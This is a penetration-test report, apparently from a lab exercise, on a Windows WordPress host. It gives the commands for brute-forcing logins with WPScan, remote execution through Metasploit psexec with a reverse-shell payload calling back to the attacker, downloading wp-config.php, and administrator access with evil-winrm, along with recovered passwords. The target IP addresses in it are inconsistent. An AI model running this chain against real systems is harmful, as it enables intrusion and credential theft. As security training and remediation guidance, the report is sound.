# Technical Report: Target Virtual Machine

This technical report fully documents the penetration test performed against the target virtual machine.

---

## Scanning and Enumeration Phase

The objective of this phase was to identify active services and possible attack vectors. A port scan was carried out against the target machine using reconnaissance tools.

<img width="1123" height="566" alt="image" src="https://github.com/user-attachments/assets/8595f388-17cf-48ad-bb95-6dca426ba915" />

The following open ports were detected:

| Port | Service | Description |
|---|---|---|
| 80 | HTTP | Web server (Apache/PHP) |
| 135 | RPC | Remote Procedure Calls |
| 139 | NetBIOS | Windows network sharing service |
| 445 | SMB | Windows file sharing |
| 5985 | WinRM | Windows remote administration |

### Analysis of Detected Services

### Port 80 (HTTP)
Port 80 is open and accessible, hosting a web server based on Apache with PHP support. During enumeration, a WordPress-based website was identified.

Possible attack vectors:

- User enumeration.
- Brute-force attacks against the login panel.
- Exploitation of vulnerable plugins or services.

### Ports 135, 139, 445 (RPC/NetBIOS/SMB)
These ports correspond to internal Windows network services used for file sharing and remote administration.

Possible attack vectors:

- Enumeration of shared resources.
- Access to internal files.
- Authentication using valid credentials.
- Remote command execution if sufficient privileges are obtained.

### Port 5985 (WinRM)
The WinRM service allows remote system administration over HTTP.

Possible attack vectors:

- Remote access using valid credentials.
- Remote command execution.
- Full system control without additional exploitation.

### Scan Phase Conclusion
The system exposed multiple services that increase the attack surface.

In particular:

- The web service on port 80 could reveal useful information and possible credentials.
- SMB (445) and WinRM (5985) could be used for remote access if credentials were compromised.

### General Recommendations for Windows

- Restrict access to port 80 only to internal networks or a bastioned zone; block external access to the web server.
- Limit access to ports 135, 139, and 445 only to trusted internal PCs and disable SMBv1 if enabled.
- Review and harden web credential handling, and if WinRM is used, configure it over HTTPS (port 5986) instead of exposing it to open networks.

---

## 1. Web Server Accessible on Port 80

<img width="527" height="279" alt="image" src="https://github.com/user-attachments/assets/e548de12-8bac-4a75-9b6d-443b7d55c623" />

### Web Service Enumeration (Port 80)
The target machine exposes an active web service on port 80 that is reachable from the network.

When accessed through a browser, a functional website was observed without visible protection against enumeration or automated attacks.

### Web Analysis with WhatWeb
WhatWeb was used to identify the technologies employed by the server.

Detected technologies:

- Web server: Apache 2.4.41
- Operating system: Windows (64-bit)
- Language: PHP 7.3.12

<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/974e137b-72fa-4659-a889-08a1d1edacbd" />

### Security Analysis
The exposure of specific web server and programming language versions allows an attacker to:

- Identify known vulnerabilities.
- Search for public exploits associated with those versions.

Version disclosure makes it easier to search for specific exploits targeting Apache and PHP.

### Recommendations

- Hide or limit version exposure in HTTP headers (for example, hide Apache/X.X and PHP/XX).
- Update Apache and PHP to recent patched versions, especially if the server is exposed externally.
- Audit the server with vulnerability scanners such as Nuclei and WPScan to detect exploits compatible with the current versions.

---

## Fuzzing Scan

### Fuzzing and Directory Discovery
A fuzzing process was performed on the web server using FFUF to identify hidden routes and accessible services.

### Results Obtained
Several paths associated with a WordPress installation were identified:

- `/wp-admin` → Administration panel.
- `/wp-login.php` → Authentication page.
- `/wp-config.php` → Configuration file.
- `/xmlrpc.php` → Remote communication interface.
- `/license.txt` and `/readme.html` → Documentation files.

<img width="1031" height="909" alt="image" src="https://github.com/user-attachments/assets/0ecbf1b7-1ec9-4f8d-aa62-6a768c43e5a5" />

### Identified Vulnerabilities

#### WordPress Structure Exposure — Severity: Medium
Accessibility to routes such as `/wp-admin` and `/wp-login.php` allows the system to be identified and enables targeted attacks.

#### Documentation File Exposure — Severity: Medium
Files such as `readme.html` or `license.txt` may reveal:

- WordPress version.
- System information.

This helps attackers search for known vulnerabilities.

#### Possible Configuration File Exposure (`wp-config.php`) — Severity: Critical
The `wp-config.php` file contains sensitive information such as:

- Database credentials.
- Internal configuration.

If this file is accessible from the browser, it can lead to full system compromise.

#### XML-RPC Enabled — Severity: High
The `/xmlrpc.php` file allows:

- Automated brute-force attacks.
- User enumeration.
- Possible denial-of-service attacks.

### Conclusion
Fuzzing made it possible to identify the internal structure of the website, confirming the use of WordPress and revealing multiple attack points that could be used in later exploitation stages.

---

## WordPress Analysis and Redirect Behavior

### WordPress Site Analysis
When accessing the WordPress site at `http://192.168.0.27/wordpress/`, anomalous behavior was observed during navigation.

### Detected Behavior

- Some routes redirected or returned errors showing signs that the server was configured as if it were running on localhost or in a test environment.
- The WordPress login panel (`wp-login.php`) did not allow proper access even when valid credentials were available.

<img width="468" height="282" alt="image" src="https://github.com/user-attachments/assets/31abc063-7028-4fb0-a0f4-0bf601c8342b" />

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/92637635-654f-4b61-849b-fae7569925b4" />

### Automated Analysis of the Web Service
Given the detected situation, the analysis was focused on the only page that responded consistently and displayed clear HTTP headers. An automated analysis was performed on this resource, revealing several relevant security weaknesses.

### Vulnerability: WordPress Login Panel Exposure
A WordPress authentication page was identified and remained directly accessible despite possible attempts to hide or restrict it.

Accessible path: `/wp-login.php`

This facilitates enumeration and brute-force attacks against the authentication system.

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/9a109ead-e28f-4cc4-afb1-22ada8c41500" />

Associated reference:
- CVE-2024-2473 (reference to login endpoint exposure in insecure or poorly protected configurations).

---

## WordPress Enumeration and Analysis

During the web service analysis phase, it was identified that WordPress allowed user enumeration through the REST API.

### User Enumeration
Using the endpoint:

`/wp-json/wp/v2/users`

The following valid system users were identified:

- Administrator
- Roldan

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/0cbafa23-5dbe-4523-96a1-c7a487477db5" />

### Automated Analysis with Nuclei
Nuclei was then used against the site URL: `http://192.168.0.27/wordpress/`

The analysis detected several relevant security indicators:

Detected vulnerabilities:

- WordPress login panel exposed — Medium.
- User enumeration enabled — Medium/High.
- Accessible login form (possible brute force) — High.
- WordPress version 5.4.19 outdated — Medium.
- PHP 7.3.x outdated — Medium.
- Informational files exposed (`readme` / directory listing) — Low/Informational.

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/8229344d-5a53-4067-ae37-3d158d9c32ab" />
<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/451e7112-bbdd-4440-9b3a-b5c5cb786107" />

### Impact of the Vulnerabilities

These weaknesses allow an attacker to:

- Identify valid system users.
- Perform brute-force attacks against the login panel.
- Exploit outdated versions with known vulnerabilities.
- Increase the attack surface of the web service.

### General Recommendations

- Update WordPress and PHP to current patched versions.
- Disable or restrict the WordPress REST API and `wp-json`.
- Hide `readme.html`, `license.txt`, and limit directory listing.
- Control and validate redirects to prevent malicious use.
- Strengthen login security with attempt blocking, captchas, and two-factor authentication.

---

## Wordlist Creation with CeWL

CeWL was used to generate a custom dictionary from the WordPress site content for later use in brute-force attacks against the authentication panel.

### Executed command
```bash
cewl -e http://192.168.0.27/wordpress/ -m 4 -w prototipo_xd
```

### Result
A dictionary named `prototipo_xd` was generated from words extracted from the page content. Notable terms included:

- Roldan
- Quesos
- Manchego
- Quesosroldan

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/4f616aef-bd23-44fe-9117-bcee5134b763" />

### Analysis
The generated dictionary contained context-specific terms from the target site, increasing the effectiveness of brute-force attacks compared to generic dictionaries. This approach adapts the attack to the real environment of the target system.

### Vulnerability Classification

- Type: Exposure of useful information for dictionary attacks.
- Severity: Medium.
- Impact: Facilitates targeted brute-force attacks against the authentication panel.

### Recommendations

- Restrict access to the WordPress administration panel by IP or internal network.
- Hide or change the `wp-login.php` URL to make automated attacks harder.
- Strengthen login security with failed attempt locking and two-factor authentication.

---

## WordPress Exploitation

### Brute-Force Attack Against WordPress
WPScan was used to perform a brute-force attack against the WordPress authentication panel using the custom dictionary generated previously.

### Executed command
```bash
wpscan --url http://192.168.0.27/wordpress/ --usernames administrador,roldan --passwords prototipo_xd
```

### Objective
Obtain valid credentials for access to the administration panel through dictionary attack.

### Result
The attack was successful, obtaining the following credentials:

- User: `roldan`
- Password: `QuesoManchego`

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/0274338c-177b-43fe-843a-2734eecce46d" />

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/bb74396c-d59c-42f2-9c0e-48f068d2aa2f" />

- When attempting to log in, the site redirected to localhost, so the administration panel could not be accessed from the attacker machine.
- Vulnerability type: valid admin access blocked by incorrect URL configuration.
- Severity: High.

### Recommendations

- Review the WordPress Address and Site URL settings so they do not point to localhost.
- Move or remove the test localhost site if it is not in production.
- Restrict administration panel access to internal IPs in production environments.

---

## Pivot to SMB

### Access to SMB Service
Using the credentials obtained previously from the WordPress brute-force attack, access to the SMB service exposed on the Windows machine was tested.

### Validation and Access
NetExec was used to verify the validity of the credentials against SMB:

```bash
netexec smb 192.168.5.140 -u roldan -p "QuesoManchego"
```

<img width="1062" height="562" alt="image" src="https://github.com/user-attachments/assets/f665994c-7593-4883-8525-980d967114b1" />

### Enumeration of Users and Resources
After validation, enumeration tasks were performed:

**System users:**

- Administrador
- Guest
- Roldan

**Detected shared resources:**

- ADMIN$
- C$
- IPC$

### Vulnerability Classification

- Type: Unauthorized access using valid credentials.
- Severity: High.
- Impact: Access to internal Windows system resources and enumeration of sensitive information.

### Recommendations

- Restrict SMB access to internal networks only, with credential control.
- Avoid weak local accounts (`roldan`, `administrator`) with passwords related to website content.
- Clearly separate the localhost test web environment from the production network to prevent test credentials from being used on the real system.

---

## Remote Execution via SMB (Metasploit)

After obtaining valid credentials on the system, the possibility of accessing the Windows SMB service was identified. Based on earlier enumeration, it was observed that the user had sufficient permissions to interact with administrative resources, which motivated the use of a remote execution module.

### Module used
`exploit/windows/smb/ms17_010_psexec`

This module allows remote command execution through SMB using valid credentials.

### Exploit Configuration

- User: `roldan`
- Password: `QuesoManchego`
- Target host: `192.168.0.26`
- Port: `445`
- Payload: `meterpreter/reverse_tcp`
- LHOST: `192.168.0.19`
- LPORT: `4444`

<img width="1183" height="549" alt="image" src="https://github.com/user-attachments/assets/0dca61f4-a636-4203-9a4a-8d9846ed13d3" />

### Justification of the Exploitation
After validating SMB access with valid credentials and observing the existence of administrative resources, it was concluded that the user had sufficient privileges for remote code execution.

For this reason, the PsExec module was used, which creates a service on the target system and executes a malicious payload.

The exploit established a remote connection with the victim system through a Meterpreter session, confirming remote code execution on the Windows host.

### Vulnerability Classification

- Type: Remote code execution via SMB.
- Severity: Critical.
- Impact: Full system compromise (remote access to the Windows machine).

---

## Internal File Access and Credential Extraction

Once remote execution was obtained through the Meterpreter session, sensitive files were searched for within the system. Since WordPress had already been identified, the configuration file (`wp-config.php`) was targeted because it usually contains database credentials.

### Searching for the Configuration File
The following command was used:

```bash
dir /s /b C:\wp-config.php
```

The following path was identified:

`C:\wamp64\www\wordpress\wp-config.php`

### Downloading the File
After locating it, the file was downloaded to the attacker machine through Meterpreter:

```bash
download C:\\wamp64\\www\\wordpress\\wp-config.php
```

The file was transferred successfully to the auditor’s system.

<img width="999" height="602" alt="image" src="https://github.com/user-attachments/assets/8cfadd39-cb5f-44dc-bea1-216429307294" />

<img width="1185" height="590" alt="image" src="https://github.com/user-attachments/assets/ca8af1e5-953d-48b9-b22e-edc0f687b295" />

The earlier web access did not allow this file to be viewed due to server restrictions and localhost-related configuration. However, once direct access to the system was obtained, it was possible to access the configuration file containing sensitive information such as:

- Database credentials.
- Internal WordPress configuration.

The WordPress configuration file contains plaintext credentials for the database connection.

The acquisition of these credentials implies:

- Direct access to the system database.
- Possibility to read, modify, or delete information.
- Access to sensitive data such as users, passwords, and site content.

This attack chain demonstrates how an initial vulnerability in the web service can lead to full system compromise and exposure of critical credentials.

---

## Remote Access via WinRM

After obtaining credentials from `wp-config.php`, they were reused against other system services. Since WinRM (port 5985) was active, remote access was attempted using those credentials.

```bash
evil-winrm -i 192.168.0.26 -u Administrator -p T00MuchW0rk70D0
```

<img width="1208" height="571" alt="image" src="https://github.com/user-attachments/assets/4f10fe47-3bba-47ae-89d5-f75e7f964bf5" />

### Vulnerability Classification

- Type: Credential reuse / unauthorized remote access.
- Severity: Critical.
- Impact: Full system control (administrator access).

Credential reuse allowed direct access to the system through WinRM with administrative privileges, confirming full compromise of the machine.

---

## Conclusion

This audit demonstrated that, starting from initial access to the web service, it is possible to fully compromise the infrastructure.

The combination of weak credentials, password reuse, and exposure of internal services allowed the attack to escalate until maximum privileges were obtained on both systems.

This represents a critical risk for the organization, as an attacker could take full control of the systems, access sensitive information, and compromise the integrity of the environment.
